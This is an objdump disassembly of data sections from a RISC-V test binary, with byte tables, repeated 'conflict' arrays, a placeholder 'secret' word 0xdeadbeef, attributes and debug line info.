    80401014:	1514                	.2byte	0x1514
    80401016:	1716                	.2byte	0x1716
    80401018:	1918                	.2byte	0x1918
    8040101a:	1b1a                	.2byte	0x1b1a
    8040101c:	1d1c                	.2byte	0x1d1c
    8040101e:	1f1e                	.2byte	0x1f1e
    80401020:	2120                	.2byte	0x2120
    80401022:	2322                	.2byte	0x2322
    80401024:	2524                	.2byte	0x2524
    80401026:	2726                	.2byte	0x2726
    80401028:	2928                	.2byte	0x2928
    8040102a:	2b2a                	.2byte	0x2b2a
    8040102c:	2d2c                	.2byte	0x2d2c
    8040102e:	2f2e                	.2byte	0x2f2e
    80401030:	3130                	.2byte	0x3130
    80401032:	3332                	.2byte	0x3332
    80401034:	3534                	.2byte	0x3534
    80401036:	3736                	.2byte	0x3736
    80401038:	3938                	.2byte	0x3938
    8040103a:	3b3a                	.2byte	0x3b3a
    8040103c:	3d3c                	.2byte	0x3d3c
    8040103e:	3f3e                	.2byte	0x3f3e
    80401040:	4140                	.2byte	0x4140
    80401042:	4342                	.2byte	0x4342
    80401044:	4544                	.2byte	0x4544
    80401046:	4746                	.2byte	0x4746
    80401048:	4948                	.2byte	0x4948
    8040104a:	4b4a                	.2byte	0x4b4a
    8040104c:	4d4c                	.2byte	0x4d4c
    8040104e:	4f4e                	.2byte	0x4f4e
    80401050:	5150                	.2byte	0x5150
    80401052:	5352                	.2byte	0x5352
    80401054:	5554                	.2byte	0x5554
    80401056:	5756                	.2byte	0x5756
    80401058:	5958                	.2byte	0x5958
    8040105a:	5b5a                	.2byte	0x5b5a
    8040105c:	5d5c                	.2byte	0x5d5c
    8040105e:	5f5e                	.2byte	0x5f5e
    80401060:	6160                	.2byte	0x6160
    80401062:	6362                	.2byte	0x6362
    80401064:	6564                	.2byte	0x6564
    80401066:	6766                	.2byte	0x6766
    80401068:	6968                	.2byte	0x6968
    8040106a:	6b6a                	.2byte	0x6b6a
    8040106c:	6d6c                	.2byte	0x6d6c
    8040106e:	6f6e                	.2byte	0x6f6e
    80401070:	7170                	.2byte	0x7170
    80401072:	7372                	.2byte	0x7372
    80401074:	7574                	.2byte	0x7574
    80401076:	7776                	.2byte	0x7776
    80401078:	7978                	.2byte	0x7978
    8040107a:	7b7a                	.2byte	0x7b7a
    8040107c:	7d7c                	.2byte	0x7d7c
    8040107e:	7f7e                	.2byte	0x7f7e
	...

0000000080402000 <data2>:
    80402000:	0100                	.2byte	0x100
    80402002:	0302                	.2byte	0x302
    80402004:	0504                	.2byte	0x504
    80402006:	0706                	.2byte	0x706
    80402008:	0908                	.2byte	0x908
    8040200a:	0b0a                	.2byte	0xb0a
    8040200c:	0d0c                	.2byte	0xd0c
    8040200e:	0f0e                	.2byte	0xf0e
    80402010:	1110                	.2byte	0x1110
    80402012:	1312                	.2byte	0x1312
    80402014:	1514                	.2byte	0x1514
    80402016:	1716                	.2byte	0x1716
    80402018:	1918                	.2byte	0x1918
    8040201a:	1b1a                	.2byte	0x1b1a
    8040201c:	1d1c                	.2byte	0x1d1c
    8040201e:	1f1e                	.2byte	0x1f1e
    80402020:	2120                	.2byte	0x2120
    80402022:	2322                	.2byte	0x2322
    80402024:	2524                	.2byte	0x2524
    80402026:	2726                	.2byte	0x2726
    80402028:	2928                	.2byte	0x2928
    8040202a:	2b2a                	.2byte	0x2b2a
    8040202c:	2d2c                	.2byte	0x2d2c
    8040202e:	2f2e                	.2byte	0x2f2e
    80402030:	3130                	.2byte	0x3130
    80402032:	3332                	.2byte	0x3332
    80402034:	3534                	.2byte	0x3534
    80402036:	3736                	.2byte	0x3736
    80402038:	3938                	.2byte	0x3938
    8040203a:	3b3a                	.2byte	0x3b3a
    8040203c:	3d3c                	.2byte	0x3d3c
    8040203e:	3f3e                	.2byte	0x3f3e
    80402040:	4140                	.2byte	0x4140
    80402042:	4342                	.2byte	0x4342
    80402044:	4544                	.2byte	0x4544
    80402046:	4746                	.2byte	0x4746
    80402048:	4948                	.2byte	0x4948
    8040204a:	4b4a                	.2byte	0x4b4a
    8040204c:	4d4c                	.2byte	0x4d4c
    8040204e:	4f4e                	.2byte	0x4f4e
    80402050:	5150                	.2byte	0x5150
    80402052:	5352                	.2byte	0x5352
    80402054:	5554                	.2byte	0x5554
    80402056:	5756                	.2byte	0x5756
    80402058:	5958                	.2byte	0x5958
    8040205a:	5b5a                	.2byte	0x5b5a
    8040205c:	5d5c                	.2byte	0x5d5c
    8040205e:	5f5e                	.2byte	0x5f5e
    80402060:	6160                	.2byte	0x6160
    80402062:	6362                	.2byte	0x6362
    80402064:	6564                	.2byte	0x6564
    80402066:	6766                	.2byte	0x6766
    80402068:	6968                	.2byte	0x6968
    8040206a:	6b6a                	.2byte	0x6b6a
    8040206c:	6d6c                	.2byte	0x6d6c
    8040206e:	6f6e                	.2byte	0x6f6e
    80402070:	7170                	.2byte	0x7170
    80402072:	7372                	.2byte	0x7372
    80402074:	7574                	.2byte	0x7574
    80402076:	7776                	.2byte	0x7776
    80402078:	7978                	.2byte	0x7978
    8040207a:	7b7a                	.2byte	0x7b7a
    8040207c:	7d7c                	.2byte	0x7d7c
    8040207e:	7f7e                	.2byte	0x7f7e

Disassembly of section .data.conflict:

0000000080600000 <conflict>:
    80600000:	5005                	.2byte	0x5005
    80600002:	5050                	.2byte	0x5050
    80600004:	5050                	.2byte	0x5050
    80600006:	0050                	.2byte	0x50
    80600008:	0505                	.2byte	0x505
    8060000a:	0505                	.2byte	0x505
    8060000c:	0505                	.2byte	0x505
    8060000e:	0505                	.2byte	0x505
    80600010:	5005                	.2byte	0x5005
    80600012:	5050                	.2byte	0x5050
    80600014:	5050                	.2byte	0x5050
    80600016:	0050                	.2byte	0x50
    80600018:	0505                	.2byte	0x505
    8060001a:	0505                	.2byte	0x505
    8060001c:	0505                	.2byte	0x505
    8060001e:	0505                	.2byte	0x505
    80600020:	5005                	.2byte	0x5005
    80600022:	5050                	.2byte	0x5050
    80600024:	5050                	.2byte	0x5050
    80600026:	0050                	.2byte	0x50
    80600028:	0505                	.2byte	0x505
    8060002a:	0505                	.2byte	0x505
    8060002c:	0505                	.2byte	0x505
    8060002e:	0505                	.2byte	0x505
    80600030:	5005                	.2byte	0x5005
    80600032:	5050                	.2byte	0x5050
    80600034:	5050                	.2byte	0x5050
    80600036:	0050                	.2byte	0x50
    80600038:	0505                	.2byte	0x505
    8060003a:	0505                	.2byte	0x505
    8060003c:	0505                	.2byte	0x505
    8060003e:	0505                	.2byte	0x505
    80600040:	5005                	.2byte	0x5005
    80600042:	5050                	.2byte	0x5050
    80600044:	5050                	.2byte	0x5050
    80600046:	0050                	.2byte	0x50
    80600048:	0505                	.2byte	0x505
    8060004a:	0505                	.2byte	0x505
    8060004c:	0505                	.2byte	0x505
    8060004e:	0505                	.2byte	0x505
    80600050:	5005                	.2byte	0x5005
    80600052:	5050                	.2byte	0x5050
    80600054:	5050                	.2byte	0x5050
    80600056:	0050                	.2byte	0x50
    80600058:	0505                	.2byte	0x505
    8060005a:	0505                	.2byte	0x505
    8060005c:	0505                	.2byte	0x505
    8060005e:	0505                	.2byte	0x505
    80600060:	5005                	.2byte	0x5005
    80600062:	5050                	.2byte	0x5050
    80600064:	5050                	.2byte	0x5050
    80600066:	0050                	.2byte	0x50
    80600068:	0505                	.2byte	0x505
    8060006a:	0505                	.2byte	0x505
    8060006c:	0505                	.2byte	0x505
    8060006e:	0505                	.2byte	0x505
    80600070:	5005                	.2byte	0x5005
    80600072:	5050                	.2byte	0x5050
    80600074:	5050                	.2byte	0x5050
    80600076:	0050                	.2byte	0x50
    80600078:	0505                	.2byte	0x505
    8060007a:	0505                	.2byte	0x505
    8060007c:	0505                	.2byte	0x505
    8060007e:	0505                	.2byte	0x505
	...

0000000080601000 <conflict1>:
    80601000:	5005                	.2byte	0x5005
    80601002:	5050                	.2byte	0x5050
    80601004:	5050                	.2byte	0x5050
    80601006:	0050                	.2byte	0x50
    80601008:	0505                	.2byte	0x505
    8060100a:	0505                	.2byte	0x505
    8060100c:	0505                	.2byte	0x505
    8060100e:	0505                	.2byte	0x505
    80601010:	5005                	.2byte	0x5005
    80601012:	5050                	.2byte	0x5050
    80601014:	5050                	.2byte	0x5050
    80601016:	0050                	.2byte	0x50
    80601018:	0505                	.2byte	0x505
    8060101a:	0505                	.2byte	0x505
    8060101c:	0505                	.2byte	0x505
    8060101e:	0505                	.2byte	0x505
    80601020:	5005                	.2byte	0x5005
    80601022:	5050                	.2byte	0x5050
    80601024:	5050                	.2byte	0x5050
    80601026:	0050                	.2byte	0x50
    80601028:	0505                	.2byte	0x505
    8060102a:	0505                	.2byte	0x505
    8060102c:	0505                	.2byte	0x505
    8060102e:	0505                	.2byte	0x505
    80601030:	5005                	.2byte	0x5005
    80601032:	5050                	.2byte	0x5050
    80601034:	5050                	.2byte	0x5050
    80601036:	0050                	.2byte	0x50
    80601038:	0505                	.2byte	0x505
    8060103a:	0505                	.2byte	0x505
    8060103c:	0505                	.2byte	0x505
    8060103e:	0505                	.2byte	0x505
    80601040:	5005                	.2byte	0x5005
    80601042:	5050                	.2byte	0x5050
    80601044:	5050                	.2byte	0x5050
    80601046:	0050                	.2byte	0x50
    80601048:	0505                	.2byte	0x505
    8060104a:	0505                	.2byte	0x505
    8060104c:	0505                	.2byte	0x505
    8060104e:	0505                	.2byte	0x505
    80601050:	5005                	.2byte	0x5005
    80601052:	5050                	.2byte	0x5050
    80601054:	5050                	.2byte	0x5050
    80601056:	0050                	.2byte	0x50
    80601058:	0505                	.2byte	0x505
    8060105a:	0505                	.2byte	0x505
    8060105c:	0505                	.2byte	0x505
    8060105e:	0505                	.2byte	0x505
    80601060:	5005                	.2byte	0x5005
    80601062:	5050                	.2byte	0x5050
    80601064:	5050                	.2byte	0x5050
    80601066:	0050                	.2byte	0x50
    80601068:	0505                	.2byte	0x505
    8060106a:	0505                	.2byte	0x505
    8060106c:	0505                	.2byte	0x505
    8060106e:	0505                	.2byte	0x505
    80601070:	5005                	.2byte	0x5005
    80601072:	5050                	.2byte	0x5050
    80601074:	5050                	.2byte	0x5050
    80601076:	0050                	.2byte	0x50
    80601078:	0505                	.2byte	0x505
    8060107a:	0505                	.2byte	0x505
    8060107c:	0505                	.2byte	0x505
    8060107e:	0505                	.2byte	0x505
	...

0000000080602000 <conflict2>:
    80602000:	5005                	.2byte	0x5005
    80602002:	5050                	.2byte	0x5050
    80602004:	5050                	.2byte	0x5050
    80602006:	0050                	.2byte	0x50
    80602008:	0505                	.2byte	0x505
    8060200a:	0505                	.2byte	0x505
    8060200c:	0505                	.2byte	0x505
    8060200e:	0505                	.2byte	0x505
    80602010:	5005                	.2byte	0x5005
    80602012:	5050                	.2byte	0x5050
    80602014:	5050                	.2byte	0x5050
    80602016:	0050                	.2byte	0x50
    80602018:	0505                	.2byte	0x505
    8060201a:	0505                	.2byte	0x505
    8060201c:	0505                	.2byte	0x505
    8060201e:	0505                	.2byte	0x505
    80602020:	5005                	.2byte	0x5005
    80602022:	5050                	.2byte	0x5050
    80602024:	5050                	.2byte	0x5050
    80602026:	0050                	.2byte	0x50
    80602028:	0505                	.2byte	0x505
    8060202a:	0505                	.2byte	0x505
    8060202c:	0505                	.2byte	0x505
    8060202e:	0505                	.2byte	0x505
    80602030:	5005                	.2byte	0x5005
    80602032:	5050                	.2byte	0x5050
    80602034:	5050                	.2byte	0x5050
    80602036:	0050                	.2byte	0x50
    80602038:	0505                	.2byte	0x505
    8060203a:	0505                	.2byte	0x505
    8060203c:	0505                	.2byte	0x505
    8060203e:	0505                	.2byte	0x505
    80602040:	5005                	.2byte	0x5005
    80602042:	5050                	.2byte	0x5050
    80602044:	5050                	.2byte	0x5050
    80602046:	0050                	.2byte	0x50
    80602048:	0505                	.2byte	0x505
    8060204a:	0505                	.2byte	0x505
    8060204c:	0505                	.2byte	0x505
    8060204e:	0505                	.2byte	0x505
    80602050:	5005                	.2byte	0x5005
    80602052:	5050                	.2byte	0x5050
    80602054:	5050                	.2byte	0x5050
    80602056:	0050                	.2byte	0x50
    80602058:	0505                	.2byte	0x505
    8060205a:	0505                	.2byte	0x505
    8060205c:	0505                	.2byte	0x505
    8060205e:	0505                	.2byte	0x505
    80602060:	5005                	.2byte	0x5005
    80602062:	5050                	.2byte	0x5050
    80602064:	5050                	.2byte	0x5050
    80602066:	0050                	.2byte	0x50
    80602068:	0505                	.2byte	0x505
    8060206a:	0505                	.2byte	0x505
    8060206c:	0505                	.2byte	0x505
    8060206e:	0505                	.2byte	0x505
    80602070:	5005                	.2byte	0x5005
    80602072:	5050                	.2byte	0x5050
    80602074:	5050                	.2byte	0x5050
    80602076:	0050                	.2byte	0x50
    80602078:	0505                	.2byte	0x505
    8060207a:	0505                	.2byte	0x505
    8060207c:	0505                	.2byte	0x505
    8060207e:	0505                	.2byte	0x505
	...

0000000080603000 <conflict3>:
    80603000:	5005                	.2byte	0x5005
    80603002:	5050                	.2byte	0x5050
    80603004:	5050                	.2byte	0x5050
    80603006:	0050                	.2byte	0x50
    80603008:	0505                	.2byte	0x505
    8060300a:	0505                	.2byte	0x505
    8060300c:	0505                	.2byte	0x505
    8060300e:	0505                	.2byte	0x505
    80603010:	5005                	.2byte	0x5005
    80603012:	5050                	.2byte	0x5050
    80603014:	5050                	.2byte	0x5050
    80603016:	0050                	.2byte	0x50
    80603018:	0505                	.2byte	0x505
    8060301a:	0505                	.2byte	0x505
    8060301c:	0505                	.2byte	0x505
    8060301e:	0505                	.2byte	0x505
    80603020:	5005                	.2byte	0x5005
    80603022:	5050                	.2byte	0x5050
    80603024:	5050                	.2byte	0x5050
    80603026:	0050                	.2byte	0x50
    80603028:	0505                	.2byte	0x505
    8060302a:	0505                	.2byte	0x505
    8060302c:	0505                	.2byte	0x505
    8060302e:	0505                	.2byte	0x505
    80603030:	5005                	.2byte	0x5005
    80603032:	5050                	.2byte	0x5050
    80603034:	5050                	.2byte	0x5050
    80603036:	0050                	.2byte	0x50
    80603038:	0505                	.2byte	0x505
    8060303a:	0505                	.2byte	0x505
    8060303c:	0505                	.2byte	0x505
    8060303e:	0505                	.2byte	0x505
    80603040:	5005                	.2byte	0x5005
    80603042:	5050                	.2byte	0x5050
    80603044:	5050                	.2byte	0x5050
    80603046:	0050                	.2byte	0x50
    80603048:	0505                	.2byte	0x505
    8060304a:	0505                	.2byte	0x505
    8060304c:	0505                	.2byte	0x505
    8060304e:	0505                	.2byte	0x505
    80603050:	5005                	.2byte	0x5005
    80603052:	5050                	.2byte	0x5050
    80603054:	5050                	.2byte	0x5050
    80603056:	0050                	.2byte	0x50
    80603058:	0505                	.2byte	0x505
    8060305a:	0505                	.2byte	0x505
    8060305c:	0505                	.2byte	0x505
    8060305e:	0505                	.2byte	0x505
    80603060:	5005                	.2byte	0x5005
    80603062:	5050                	.2byte	0x5050
    80603064:	5050                	.2byte	0x5050
    80603066:	0050                	.2byte	0x50
    80603068:	0505                	.2byte	0x505
    8060306a:	0505                	.2byte	0x505
    8060306c:	0505                	.2byte	0x505
    8060306e:	0505                	.2byte	0x505
    80603070:	5005                	.2byte	0x5005
    80603072:	5050                	.2byte	0x5050
    80603074:	5050                	.2byte	0x5050
    80603076:	0050                	.2byte	0x50
    80603078:	0505                	.2byte	0x505
    8060307a:	0505                	.2byte	0x505
    8060307c:	0505                	.2byte	0x505
    8060307e:	0505                	.2byte	0x505
	...

0000000080604000 <conflict4>:
    80604000:	5005                	.2byte	0x5005
    80604002:	5050                	.2byte	0x5050
    80604004:	5050                	.2byte	0x5050
    80604006:	0050                	.2byte	0x50
    80604008:	0505                	.2byte	0x505
    8060400a:	0505                	.2byte	0x505
    8060400c:	0505                	.2byte	0x505
    8060400e:	0505                	.2byte	0x505
    80604010:	5005                	.2byte	0x5005
    80604012:	5050                	.2byte	0x5050
    80604014:	5050                	.2byte	0x5050
    80604016:	0050                	.2byte	0x50
    80604018:	0505                	.2byte	0x505
    8060401a:	0505                	.2byte	0x505
    8060401c:	0505                	.2byte	0x505
    8060401e:	0505                	.2byte	0x505
    80604020:	5005                	.2byte	0x5005
    80604022:	5050                	.2byte	0x5050
    80604024:	5050                	.2byte	0x5050
    80604026:	0050                	.2byte	0x50
    80604028:	0505                	.2byte	0x505
    8060402a:	0505                	.2byte	0x505
    8060402c:	0505                	.2byte	0x505
    8060402e:	0505                	.2byte	0x505
    80604030:	5005                	.2byte	0x5005
    80604032:	5050                	.2byte	0x5050
    80604034:	5050                	.2byte	0x5050
    80604036:	0050                	.2byte	0x50
    80604038:	0505                	.2byte	0x505
    8060403a:	0505                	.2byte	0x505
    8060403c:	0505                	.2byte	0x505
    8060403e:	0505                	.2byte	0x505
    80604040:	5005                	.2byte	0x5005
    80604042:	5050                	.2byte	0x5050
    80604044:	5050                	.2byte	0x5050
    80604046:	0050                	.2byte	0x50
    80604048:	0505                	.2byte	0x505
    8060404a:	0505                	.2byte	0x505
    8060404c:	0505                	.2byte	0x505
    8060404e:	0505                	.2byte	0x505
    80604050:	5005                	.2byte	0x5005
    80604052:	5050                	.2byte	0x5050
    80604054:	5050                	.2byte	0x5050
    80604056:	0050                	.2byte	0x50
    80604058:	0505                	.2byte	0x505
    8060405a:	0505                	.2byte	0x505
    8060405c:	0505                	.2byte	0x505
    8060405e:	0505                	.2byte	0x505
    80604060:	5005                	.2byte	0x5005
    80604062:	5050                	.2byte	0x5050
    80604064:	5050                	.2byte	0x5050
    80604066:	0050                	.2byte	0x50
    80604068:	0505                	.2byte	0x505
    8060406a:	0505                	.2byte	0x505
    8060406c:	0505                	.2byte	0x505
    8060406e:	0505                	.2byte	0x505
    80604070:	5005                	.2byte	0x5005
    80604072:	5050                	.2byte	0x5050
    80604074:	5050                	.2byte	0x5050
    80604076:	0050                	.2byte	0x50
    80604078:	0505                	.2byte	0x505
    8060407a:	0505                	.2byte	0x505
    8060407c:	0505                	.2byte	0x505
    8060407e:	0505                	.2byte	0x505
	...

0000000080605000 <conflict5>:
    80605000:	5005                	.2byte	0x5005
    80605002:	5050                	.2byte	0x5050
    80605004:	5050                	.2byte	0x5050
    80605006:	0050                	.2byte	0x50
    80605008:	0505                	.2byte	0x505
    8060500a:	0505                	.2byte	0x505
    8060500c:	0505                	.2byte	0x505
    8060500e:	0505                	.2byte	0x505
    80605010:	5005                	.2byte	0x5005
    80605012:	5050                	.2byte	0x5050
    80605014:	5050                	.2byte	0x5050
    80605016:	0050                	.2byte	0x50
    80605018:	0505                	.2byte	0x505
    8060501a:	0505                	.2byte	0x505
    8060501c:	0505                	.2byte	0x505
    8060501e:	0505                	.2byte	0x505
    80605020:	5005                	.2byte	0x5005
    80605022:	5050                	.2byte	0x5050
    80605024:	5050                	.2byte	0x5050
    80605026:	0050                	.2byte	0x50
    80605028:	0505                	.2byte	0x505
    8060502a:	0505                	.2byte	0x505
    8060502c:	0505                	.2byte	0x505
    8060502e:	0505                	.2byte	0x505
    80605030:	5005                	.2byte	0x5005
    80605032:	5050                	.2byte	0x5050
    80605034:	5050                	.2byte	0x5050
    80605036:	0050                	.2byte	0x50
    80605038:	0505                	.2byte	0x505
    8060503a:	0505                	.2byte	0x505
    8060503c:	0505                	.2byte	0x505
    8060503e:	0505                	.2byte	0x505
    80605040:	5005                	.2byte	0x5005
    80605042:	5050                	.2byte	0x5050
    80605044:	5050                	.2byte	0x5050
    80605046:	0050                	.2byte	0x50
    80605048:	0505                	.2byte	0x505
    8060504a:	0505                	.2byte	0x505
    8060504c:	0505                	.2byte	0x505
    8060504e:	0505                	.2byte	0x505
    80605050:	5005                	.2byte	0x5005
    80605052:	5050                	.2byte	0x5050
    80605054:	5050                	.2byte	0x5050
    80605056:	0050                	.2byte	0x50
    80605058:	0505                	.2byte	0x505
    8060505a:	0505                	.2byte	0x505
    8060505c:	0505                	.2byte	0x505
    8060505e:	0505                	.2byte	0x505
    80605060:	5005                	.2byte	0x5005
    80605062:	5050                	.2byte	0x5050
    80605064:	5050                	.2byte	0x5050
    80605066:	0050                	.2byte	0x50
    80605068:	0505                	.2byte	0x505
    8060506a:	0505                	.2byte	0x505
    8060506c:	0505                	.2byte	0x505
    8060506e:	0505                	.2byte	0x505
    80605070:	5005                	.2byte	0x5005
    80605072:	5050                	.2byte	0x5050
    80605074:	5050                	.2byte	0x5050
    80605076:	0050                	.2byte	0x50
    80605078:	0505                	.2byte	0x505
    8060507a:	0505                	.2byte	0x505
    8060507c:	0505                	.2byte	0x505
    8060507e:	0505                	.2byte	0x505
	...

0000000080606000 <conflict6>:
    80606000:	5005                	.2byte	0x5005
    80606002:	5050                	.2byte	0x5050
    80606004:	5050                	.2byte	0x5050
    80606006:	0050                	.2byte	0x50
    80606008:	0505                	.2byte	0x505
    8060600a:	0505                	.2byte	0x505
    8060600c:	0505                	.2byte	0x505
    8060600e:	0505                	.2byte	0x505
    80606010:	5005                	.2byte	0x5005
    80606012:	5050                	.2byte	0x5050
    80606014:	5050                	.2byte	0x5050
    80606016:	0050                	.2byte	0x50
    80606018:	0505                	.2byte	0x505
    8060601a:	0505                	.2byte	0x505
    8060601c:	0505                	.2byte	0x505
    8060601e:	0505                	.2byte	0x505
    80606020:	5005                	.2byte	0x5005
    80606022:	5050                	.2byte	0x5050
    80606024:	5050                	.2byte	0x5050
    80606026:	0050                	.2byte	0x50
    80606028:	0505                	.2byte	0x505
    8060602a:	0505                	.2byte	0x505
    8060602c:	0505                	.2byte	0x505
    8060602e:	0505                	.2byte	0x505
    80606030:	5005                	.2byte	0x5005
    80606032:	5050                	.2byte	0x5050
    80606034:	5050                	.2byte	0x5050
    80606036:	0050                	.2byte	0x50
    80606038:	0505                	.2byte	0x505
    8060603a:	0505                	.2byte	0x505
    8060603c:	0505                	.2byte	0x505
    8060603e:	0505                	.2byte	0x505
    80606040:	5005                	.2byte	0x5005
    80606042:	5050                	.2byte	0x5050
    80606044:	5050                	.2byte	0x5050
    80606046:	0050                	.2byte	0x50
    80606048:	0505                	.2byte	0x505
    8060604a:	0505                	.2byte	0x505
    8060604c:	0505                	.2byte	0x505
    8060604e:	0505                	.2byte	0x505
    80606050:	5005                	.2byte	0x5005
    80606052:	5050                	.2byte	0x5050
    80606054:	5050                	.2byte	0x5050
    80606056:	0050                	.2byte	0x50
    80606058:	0505                	.2byte	0x505
    8060605a:	0505                	.2byte	0x505
    8060605c:	0505                	.2byte	0x505
    8060605e:	0505                	.2byte	0x505
    80606060:	5005                	.2byte	0x5005
    80606062:	5050                	.2byte	0x5050
    80606064:	5050                	.2byte	0x5050
    80606066:	0050                	.2byte	0x50
    80606068:	0505                	.2byte	0x505
    8060606a:	0505                	.2byte	0x505
    8060606c:	0505                	.2byte	0x505
    8060606e:	0505                	.2byte	0x505
    80606070:	5005                	.2byte	0x5005
    80606072:	5050                	.2byte	0x5050
    80606074:	5050                	.2byte	0x5050
    80606076:	0050                	.2byte	0x50
    80606078:	0505                	.2byte	0x505
    8060607a:	0505                	.2byte	0x505
    8060607c:	0505                	.2byte	0x505
    8060607e:	0505                	.2byte	0x505
	...

0000000080607000 <conflict7>:
    80607000:	5005                	.2byte	0x5005
    80607002:	5050                	.2byte	0x5050
    80607004:	5050                	.2byte	0x5050
    80607006:	0050                	.2byte	0x50
    80607008:	0505                	.2byte	0x505
    8060700a:	0505                	.2byte	0x505
    8060700c:	0505                	.2byte	0x505
    8060700e:	0505                	.2byte	0x505
    80607010:	5005                	.2byte	0x5005
    80607012:	5050                	.2byte	0x5050
    80607014:	5050                	.2byte	0x5050
    80607016:	0050                	.2byte	0x50
    80607018:	0505                	.2byte	0x505
    8060701a:	0505                	.2byte	0x505
    8060701c:	0505                	.2byte	0x505
    8060701e:	0505                	.2byte	0x505
    80607020:	5005                	.2byte	0x5005
    80607022:	5050                	.2byte	0x5050
    80607024:	5050                	.2byte	0x5050
    80607026:	0050                	.2byte	0x50
    80607028:	0505                	.2byte	0x505
    8060702a:	0505                	.2byte	0x505
    8060702c:	0505                	.2byte	0x505
    8060702e:	0505                	.2byte	0x505
    80607030:	5005                	.2byte	0x5005
    80607032:	5050                	.2byte	0x5050
    80607034:	5050                	.2byte	0x5050
    80607036:	0050                	.2byte	0x50
    80607038:	0505                	.2byte	0x505
    8060703a:	0505                	.2byte	0x505
    8060703c:	0505                	.2byte	0x505
    8060703e:	0505                	.2byte	0x505
    80607040:	5005                	.2byte	0x5005
    80607042:	5050                	.2byte	0x5050
    80607044:	5050                	.2byte	0x5050
    80607046:	0050                	.2byte	0x50
    80607048:	0505                	.2byte	0x505
    8060704a:	0505                	.2byte	0x505
    8060704c:	0505                	.2byte	0x505
    8060704e:	0505                	.2byte	0x505
    80607050:	5005                	.2byte	0x5005
    80607052:	5050                	.2byte	0x5050
    80607054:	5050                	.2byte	0x5050
    80607056:	0050                	.2byte	0x50
    80607058:	0505                	.2byte	0x505
    8060705a:	0505                	.2byte	0x505
    8060705c:	0505                	.2byte	0x505
    8060705e:	0505                	.2byte	0x505
    80607060:	5005                	.2byte	0x5005
    80607062:	5050                	.2byte	0x5050
    80607064:	5050                	.2byte	0x5050
    80607066:	0050                	.2byte	0x50
    80607068:	0505                	.2byte	0x505
    8060706a:	0505                	.2byte	0x505
    8060706c:	0505                	.2byte	0x505
    8060706e:	0505                	.2byte	0x505
    80607070:	5005                	.2byte	0x5005
    80607072:	5050                	.2byte	0x5050
    80607074:	5050                	.2byte	0x5050
    80607076:	0050                	.2byte	0x50
    80607078:	0505                	.2byte	0x505
    8060707a:	0505                	.2byte	0x505
    8060707c:	0505                	.2byte	0x505
    8060707e:	0505                	.2byte	0x505

Disassembly of section .data.secret:

0000000080800000 <secret>:
    80800000:	deadbeef          	jal	t4,807db5ea <conflict7+0x1d45ea>
    80800004:	0000                	.2byte	0x0
	...

Disassembly of section .tbss:

0000000080800040 <threadsense.2+0x807fffbc>:
	...

Disassembly of section .riscv.attributes:

0000000000000000 <.riscv.attributes>:
   0:	5141                	.2byte	0x5141
   2:	0000                	.2byte	0x0
   4:	7200                	.2byte	0x7200
   6:	7369                	.2byte	0x7369
   8:	01007663          	bgeu	zero,a6,14 <threadsense.5+0x14>
   c:	00000047          	fmsub.s	ft0,ft0,ft0,ft0,rne
  10:	1004                	.2byte	0x1004
  12:	7205                	.2byte	0x7205
  14:	3676                	.2byte	0x3676
  16:	6934                	.2byte	0x6934
  18:	7032                	.2byte	0x7032
  1a:	5f31                	.2byte	0x5f31
  1c:	326d                	.2byte	0x326d
  1e:	3070                	.2byte	0x3070
  20:	615f 7032 5f31      	.byte	0x5f, 0x61, 0x32, 0x70, 0x31, 0x5f
  26:	3266                	.2byte	0x3266
  28:	3270                	.2byte	0x3270
  2a:	645f 7032 5f32      	.byte	0x5f, 0x64, 0x32, 0x70, 0x32, 0x5f
  30:	697a                	.2byte	0x697a
  32:	32727363          	bgeu	tp,t2,358 <threadsense.2+0x2d4>
  36:	3070                	.2byte	0x3070
  38:	7a5f 6669 6e65      	.byte	0x5f, 0x7a, 0x69, 0x66, 0x65, 0x6e
  3e:	32696563          	bltu	s2,t1,368 <threadsense.2+0x2e4>
  42:	3070                	.2byte	0x3070
  44:	7a5f 6d6d 6c75      	.byte	0x5f, 0x7a, 0x6d, 0x6d, 0x75, 0x6c
  4a:	7031                	.2byte	0x7031
  4c:	0030                	.2byte	0x30
  4e:	0108                	.2byte	0x108
  50:	0b0a                	.2byte	0xb0a

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	.2byte	0x2820
   6:	65653267          	.4byte	0x65653267
   a:	6535                	.2byte	0x6535
   c:	3334                	.2byte	0x3334
   e:	3030                	.2byte	0x3030
  10:	3831                	.2byte	0x3831
  12:	2029                	.2byte	0x2029
  14:	3231                	.2byte	0x3231
  16:	322e                	.2byte	0x322e
  18:	302e                	.2byte	0x302e
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	000002ab          	.4byte	0x2ab
       4:	0005                	.2byte	0x5
       6:	0008                	.2byte	0x8
       8:	002e                	.2byte	0x2e
       a:	0000                	.2byte	0x0
       c:	0101                	.2byte	0x101
       e:	fb01                	.2byte	0xfb01
      10:	0d0e                	.2byte	0xd0e
      12:	0100                	.2byte	0x100
      14:	0101                	.2byte	0x101
      16:	0001                	.2byte	0x1
      18:	0000                	.2byte	0x0
      1a:	0001                	.2byte	0x1
      1c:	0100                	.2byte	0x100
      1e:	0101                	.2byte	0x101
      20:	021f 0000 0000      	.byte	0x1f, 0x02, 0x00, 0x00, 0x00, 0x00
      26:	0036                	.2byte	0x36
      28:	0000                	.2byte	0x0
      2a:	0102                	.2byte	0x102
      2c:	021f 020f 003a      	.byte	0x1f, 0x02, 0x0f, 0x02, 0x3a, 0x00
      32:	0000                	.2byte	0x0
      34:	3a01                	.2byte	0x3a01
      36:	0000                	.2byte	0x0
      38:	0100                	.2byte	0x100
      3a:	0900                	.2byte	0x900
      3c:	0002                	.2byte	0x2
      3e:	0000                	.2byte	0x0
      40:	0080                	.2byte	0x80
      42:	0000                	.2byte	0x0
      44:	0300                	.2byte	0x300
      46:	0118                	.2byte	0x118
      48:	04090503          	lb	a0,64(s2)
      4c:	0100                	.2byte	0x100
      4e:	04090503          	lb	a0,64(s2)
      52:	0100                	.2byte	0x100
      54:	04090103          	lb	sp,64(s2)
      58:	0100                	.2byte	0x100
      5a:	08090103          	lb	sp,128(s2)
      5e:	0100                	.2byte	0x100
      60:	04090103          	lb	sp,64(s2)
      64:	0100                	.2byte	0x100
      66:	04090503          	lb	a0,64(s2)
      6a:	0100                	.2byte	0x100
      6c:	04090103          	lb	sp,64(s2)
      70:	0100                	.2byte	0x100
      72:	04090103          	lb	sp,64(s2)
      76:	0100                	.2byte	0x100
      78:	04090103          	lb	sp,64(s2)
